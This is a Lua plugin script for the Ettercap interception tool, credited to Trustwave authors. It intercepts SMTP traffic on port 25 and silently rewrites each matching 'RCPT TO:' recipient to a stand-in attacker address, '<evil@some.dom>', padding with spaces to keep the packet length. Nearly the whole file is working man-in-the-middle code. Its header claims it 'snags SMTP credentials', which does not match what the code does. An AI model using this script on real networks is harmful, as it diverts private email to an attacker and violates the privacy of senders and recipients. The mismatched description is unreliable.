---
--
-- Created by Ryan Linn and Mike Ryan
-- Copyright (C) 2012 Trustwave Holdings, Inc.

description = "Snags SMTP credentials";

local hook_points = require("hook_points")
local stdlib = require("std")

hook_point = hook_points.tcp

packetrule = function(packet_object)
  return(packet_object:is_tcp() and 
          packet_object:has_data() and
          packet_object:dst_port() == 25)
end

local RCPT_PAT = "^(RCPT TO:)([^\r\n]*)"
local evil_address = "<evil@some.dom>"

-- Here's your action.
action = function(packet_object) 
  -- Read the packet data
  data = packet_object:read_data()
  local start, e, cmd, recipient = data:find(RCPT_PAT)
  if start == nil then
    return nil
  end

  -- Calculate the different between the address we are replacing and our own.
  local padding_amount = recipient:len() - evil_address:len()

  if padding_amount < 0 then
    -- Address too small! Can't inject.
    return nil
  end

  -- Generate new recipient, pad the front with spaces "     <evil@some.dom>"
  local inj_addr = string.rep(" ", padding_amount) ..  evil_address 

  -- Swap original recipient for our bad-guy address:
  --  "RCPT TO:     <evil@some.dom>\r\n" 
  local new_msg = data:gsub(RCPT_PAT, "%1" .. inj_addr)

  ettercap.log("Redirected email: %s -> %s\n", recipient, evil_address)

  -- Set it and forget it.
  packet_object:set_data(new_msg)
end



